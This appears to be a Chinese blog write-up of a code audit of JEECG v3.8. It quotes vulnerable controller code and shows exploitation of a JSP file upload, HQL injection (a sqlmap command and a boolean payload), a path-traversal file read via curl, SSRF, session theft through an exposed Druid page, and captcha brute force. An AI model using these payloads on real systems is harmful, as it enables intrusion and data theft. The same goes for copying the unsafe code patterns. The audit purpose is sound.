##### 前言

JEECGv3.8。下载地址：[GitHub - jeecgboot/jeecg at v3.8](https://github.com/zhangdaiscott/jeecg/tree/v3.8 "GitHub - jeecgboot/jeecg at v3.8")

java代码审计第一步：查看web.xml

一个重要的[servlet](https://so.csdn.net/so/search?q=servlet&spm=1001.2101.3001.7020)：DispatcherServlet，

```undefined
<servlet>

<description>spring mvc servlet</description>

<servlet-name>springMvc</servlet-name>

<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>

<init-param>

<description>spring mvc 配置文件</description>

<param-name>contextConfigLocation</param-name>

<param-value>classpath*:spring-mvc.xml</param-value>

</init-param>

<load-on-startup>1</load-on-startup>

</servlet>

<servlet-mapping>

<servlet-name>springMvc</servlet-name>

<url-pattern>*.do</url-pattern>

</servlet-mapping>

<servlet-mapping>

<servlet-name>springMvc</servlet-name>

<url-pattern>/rest/*</url-pattern>

</servlet-mapping>
```

        匹配规则: \*.do或者/rest/\* 引用的DispatcherServlet类调用controller处理，在Spring MVC中，访问Controller时使用后缀".do"的做法是一种传统的URL映射方式，通常称为后缀模式(suffix pattern)。使用.do后缀可以帮助区分请求是由Spring MVC处理的，而不是其他框架或者静态资源。这样可以提高代码的可维护性和灵活性，也能更好地组织和管理项目中的请求。此外，使用.do后缀还可以与其他技术栈进行集成和区分。例如，如果项目同时使用了Struts框架，可以将Spring MVC的请求配置为以.do后缀结尾，而将Struts的请求配置为以.action后缀结尾，这样就可以让两个框架共存，各自处理自己的请求。

##### 文件上传漏洞

 定位到“org.jeecgframework.web.cgform.controller.upload.CgUploadController”类的“ajaxSaveFile”方法

```java
@Controller

@RequestMapping("/cgUploadController")

public class CgUploadController extends BaseController {

...
```

```java
@RequestMapping(params = "ajaxSaveFile")

@ResponseBody

public AjaxJson ajaxSaveFile(MultipartHttpServletRequest request) {

AjaxJson ajaxJson = new AjaxJson();

Map<String, Object> attributes = new HashMap<String, Object>();

try {

Map<String, MultipartFile> fileMap = request.getFileMap();

String uploadbasepath = ResourceUtil.getConfigByName("uploadpath");

String path = uploadbasepath + "/";

String realPath = request.getSession().getServletContext().getRealPath("/") + "/" + path;

realPath += DateUtils.getDataString(DateUtils.yyyyMMdd) + "/";

path += DateUtils.getDataString(DateUtils.yyyyMMdd) + "/";

File file = new File(realPath);

if (!file.exists()) {

file.mkdirs();

}

if(fileMap != null && !fileMap.isEmpty()){

for (Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {

MultipartFile mf = entity.getValue();

String fileName = mf.getOriginalFilename();

String swfName = PinyinUtil.getPinYinHeadChar(oConvertUtils.replaceBlank(FileUtils.getFilePrefix(fileName)));

String extend = FileUtils.getExtend(fileName);

String noextfilename=DateUtils.getDataString(DateUtils.yyyymmddhhmmss)+StringUtil.random(8);

String myfilename=noextfilename+"."+extend;

String savePath = realPath + myfilename;

write2Disk(mf, extend, savePath);

TSAttachment attachment = new TSAttachment();

attachment.setId(UUID.randomUUID().toString().replace("-", ""));

attachment.setAttachmenttitle(fileName.substring(0,fileName.lastIndexOf(".")));

attachment.setCreatedate(new Timestamp(new Date().getTime()));

attachment.setExtend(extend);

attachment.setRealpath(path + myfilename);

String globalSwfTransformFlag = ResourceUtil.getConfigByName("swf.transform.flag");

if("true".equals(globalSwfTransformFlag) && !FileUtils.isPicture(extend)){

attachment.setSwfpath( path + FileUtils.getFilePrefix(myfilename) + ".swf");

SwfToolsUtil.convert2SWF(savePath);

}

systemService.save(attachment);

attributes.put("url", path + myfilename);

attributes.put("name", fileName);

attributes.put("swfpath", attachment.getSwfpath());

attributes.put("fileid", attachment.getId());

}

}

ajaxJson.setAttributes(attributes);

} catch (Exception e) {

e.printStackTrace();

ajaxJson.setSuccess(false);

ajaxJson.setMsg(e.getMessage());

}

return ajaxJson;

}
```

 重点在于

String extend = FileUtils.getExtend(fileName);// 获取文件扩展名

String myfilename=noextfilename+"."+extend;//自定义文件名称

write2Disk(mf, extend, savePath);

其中mf可控，extend可控，savePath后缀名可控

跟进去 write2Disk(mf, extend, savePath);

```java
private void write2Disk(MultipartFile mf, String extend, String savePath)

throws IOException, UnsupportedEncodingException, FileNotFoundException {

File savefile = new File(savePath);

if("txt".equals(extend)){

byte[] allbytes = mf.getBytes();

try{

String head1 = toHexString(allbytes[0]);

String head2 = toHexString(allbytes[1]);

if("ef".equals(head1) && "bb".equals(head2)){

String contents = new String(mf.getBytes(),"UTF-8");

if(StringUtils.isNotBlank(contents)){

OutputStream out = new FileOutputStream(savePath);

out.write(contents.getBytes());

out.close();

}

} else {

String contents = new String(mf.getBytes(),"GBK");

OutputStream out = new FileOutputStream(savePath);

out.write(contents.getBytes());

out.close();

}

} catch(Exception e){

String contents = new String(mf.getBytes(),"UTF-8");

if(StringUtils.isNotBlank(contents)){

OutputStream out = new FileOutputStream(savePath);

out.write(contents.getBytes());

out.close();

}

}

} else {

FileCopyUtils.copy(mf.getBytes(), savefile);

}

}
```

首先exten的不会是txt故不进入相关语句，而是直接进入 FileCopyUtils.copy(mf.getBytes(), savefile);

**漏洞利用**：先根据注解，构造路径“/cgUploadController.do?ajaxSaveFile”，然后根据“ajaxSaveFile“方法构造数据包。

![](https://i-blog.csdnimg.cn/blog_migrate/e7e7f95f2986daaefaac1a0a8416106f.png)

发送请求包 

![](https://i-blog.csdnimg.cn/blog_migrate/9965f13dc808bb57757125a8bd2a2f27.png)

 访问回显的上传后的地址

![](https://i-blog.csdnimg.cn/blog_migrate/97954ce0a174a53cc780acea16af5865.png)

 现在将问extend改成jsp

![](https://i-blog.csdnimg.cn/blog_migrate/ccb49203ce7eaa193fa9803d461e3636.png)

##### sql注入

在“com.[jeecg](https://so.csdn.net/so/search?q=jeecg&spm=1001.2101.3001.7020).demo.controller. JeecgFormDemoController类“中的“getAutocompleteData”方法，可以看到SQL语句时拼接而成的，而且也没有对“searchVal”参数进行过滤，造成SQL注入漏洞。

```java
@RequestMapping(params = "getAutocompleteData",method ={RequestMethod.GET, RequestMethod.POST})

public void getAutocompleteData(HttpServletRequest request, HttpServletResponse response) {

String searchVal = request.getParameter("q");

String hql = "from TSUser where userName like '%"+searchVal+"%'";

List autoList = systemService.findHql(hql);

........
```

**漏洞利用**

sqlmap跑一下(注中like型注入)

python sqlmap.py -u "[http://10.34.25.234:8081/jeecgFormDemoController.do?getAutocompleteData&q=1](http://10.34.25.234:8081/jeecgFormDemoController.do?getAutocompleteData&q=1 "http://10.34.25.234:8081/jeecgFormDemoController.do?getAutocompleteData&q=1")" --cookie="Hm\_lvt\_098e6e84ab585bf0c2e6853604192b8b=1698498973,1698843635,1698848203,1698849657; i18n\_browser\_Lang=zh-cn; JEECGINDEXSTYLE=fineui; ZINDEXNUMBER=1990; JSESSIONID=F6648E2CD353B8129604C8477D1549CA; Hm\_lpvt\_098e6e84ab585bf0c2e6853604192b8b=1698849665" --level=2 --risk=2

![](https://i-blog.csdnimg.cn/blog_migrate/153173941a6a97d9fa0fbbd9bcb58047.png)

 q=1%' AND 4758=4758 AND 'nLxc%'='nLxc 【暂未想到更多利用方式】

##### 任意文件读取

在“com.jeecg.demo.controller. JeecgFormDemoController”类下，“getImgByurl”方法。

```java
@RequestMapping("/filedown")

public void getImgByurl(HttpServletResponse response,HttpServletRequest request) throws Exception{

String dbpath = request.getParameter("filepath");

if(oConvertUtils.isNotEmpty(dbpath)&&dbpath.endsWith(",")){

dbpath = dbpath.substring(0, dbpath.length()-1);

}

response.setContentType("application/x-msdownload;charset=utf-8");

String fileType = dbpath.substring(dbpath.lastIndexOf("."));

String fileName=request.getParameter("filename")+fileType;

String userAgent = request.getHeader("user-agent").toLowerCase();

if (userAgent.contains("msie") || userAgent.contains("like gecko") ) {

fileName = URLEncoder.encode(fileName, "UTF-8");

}else {

fileName = new String(fileName.getBytes("UTF-8"), "iso-8859-1");

}

response.setHeader("Content-disposition", "attachment; filename="+ fileName);

InputStream inputStream = null;

OutputStream outputStream=null;

try {

String localPath=ResourceUtil.getConfigByName("webUploadpath");

String imgurl = localPath+"/"+dbpath;

inputStream = new BufferedInputStream(new FileInputStream(imgurl));

outputStream = response.getOutputStream();

byte[] buf = new byte[1024];

int len;

while ((len = inputStream.read(buf)) > 0) {

outputStream.write(buf, 0, len);

}

response.flushBuffer();

} catch (Exception e) {

logger.info("--通过流的方式获取文件异常--"+e.getMessage());

}finally{

if(inputStream!=null){

inputStream.close();

}

if(outputStream!=null){

outputStream.close();

}

}

}
```

关键代码在于

String dbpath = request.getParameter("filepath"); String imgurl = localPath+"/"+dbpath; inputStream = new BufferedInputStream(new FileInputStream(imgurl));

路径是拼接的方式

**漏洞利用方式**

> curl -i http://127.0.0.1:8081/jeecgFormDemoController/filedown.do?filepath=../../../test/user.txt -H "Cookie: JSESSIONID=942EC68A6CD4D7188A7E0E30737D7347; Hm\_lvt\_098e6e84ab585bf0c2e6853604192b8b=1698886034; i18n\_browser\_Lang=zh-cn; JEECGINDEXSTYLE=fineui; ZINDEXNUMBER=1990; Hm\_lpvt\_098e6e84ab585bf0c2e6853604192b8b=1698886042"

![](https://i-blog.csdnimg.cn/blog_migrate/b6ab0c2558c053aa1a84ccd19696ba8b.png)

##### SSRF漏洞

在“com.jeecg.demo.controller. JeecgFormDemoController”类下，“testInterface”方法。

```java
@RequestMapping(params = "interfaceTest")

@ResponseBody

public AjaxJson testInterface(HttpServletRequest request,HttpServletResponse response) {

AjaxJson j=new AjaxJson();

try {

String serverUrl = request.getParameter("serverUrl");

String requestBody = request.getParameter("requestBody");

String requestMethod = request.getParameter("requestMethod");

if(requestMethod.equals("POST")){

if(requestBody !=""){

logger.info("----请求接口开始-----");

JSONObject sendPost = HttpRequest.sendPost(serverUrl, requestBody);

logger.info("----请求接口结束-----"+sendPost);

j.setSuccess(true);

j.setObj(sendPost.toJSONString());

}else{

j.setSuccess(false);

j.setObj("请填写请求参数");

}

}

if(requestMethod.equals("GET")){

logger.info("----请求接口开始-----");

JSONObject sendGet = HttpRequest.sendGet(serverUrl, requestBody);

logger.info("----请求接口结束-----"+sendGet.toJSONString());

j.setSuccess(true);

j.setObj(sendGet);

}

} catch (Exception e) {

j.setSuccess(false);

j.setObj("服务器请求失败");

e.printStackTrace();

}

return j;

}
```

##### 绕过访问控制漏洞

有接口

```undefined
<servlet>

<servlet-name>druidStatView</servlet-name>

<servlet-class>com.alibaba.druid.support.http.StatViewServlet</servlet-class>

</servlet>

<servlet-mapping>

<servlet-name>druidStatView</servlet-name>

<url-pattern>/webpage/system/druid/*</url-pattern>

</servlet-mapping>
```

访问接口

![](https://i-blog.csdnimg.cn/blog_migrate/7aeecb226ca85efd1489e6caec322433.png)

可以访问到用户的sessionid,可以把这个信息添加到我们的cookie中， 以下漏洞接口是需要登录后才能访问的。但现在我们增加了cookie的sess字段，故可以访问。

![](https://i-blog.csdnimg.cn/blog_migrate/8412bc9dd666a13adb7a0c090554da5b.png)

##### 验证码暴力

对登录表单的验证码进行暴破

![](https://i-blog.csdnimg.cn/blog_migrate/45f23d636b11450fac5dd08a8e6a11c1.png)

![](https://i-blog.csdnimg.cn/blog_migrate/7f42831cb49617fc45c06d675fb23cf9.png)

 如果短信验证码的逻辑也是这样，那是不是我们就可以用短信验证码登录或修改任意用户。